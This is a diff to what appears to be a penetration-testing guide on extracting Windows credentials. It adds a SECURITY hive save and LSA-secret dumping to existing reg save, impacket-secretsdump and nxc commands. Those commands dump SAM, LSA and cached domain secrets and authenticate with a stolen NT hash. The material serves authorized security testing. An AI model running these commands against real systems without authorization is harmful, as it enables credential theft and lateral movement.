@@ -8,18 +8,21 @@ Local accounts' unsalted NT hashes reside in the SAM; direct copying of the live
 
 ## Local SAM and LSA
 
-Local SAM/SYSTEM:
+For SAM collect SAM/SYSTEM; add SECURITY for offline LSA secrets and cached domain material. Use a new writable output directory and check the result of each save:
 
 ```cmd
 reg save HKLM\SAM C:\Temp\sam.save
 reg save HKLM\SYSTEM C:\Temp\system.save
+reg save HKLM\SECURITY C:\Temp\security.save
 ```
 
 ```bash
-impacket-secretsdump -sam sam.save -system system.save LOCAL
+impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
 nxc smb <target-ip> -u <admin-user> -p '<password>' --sam --lsa
 impacket-secretsdump -hashes :<nt-hash> '<domain.tld>/<admin-user>@<target-ip>'
 ```
+
+Match each output to its [material type](ntlm.md): SAM yields local-account NT keys, LSA secrets can contain service/machine secrets, and cached domain verifiers are for offline cracking rather than Pass the Hash. Protect the copies and remove only files created by the extraction after evidence is retained. [Impacket offline inputs and output handling](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).
 
 ## LSASS and cached material
 
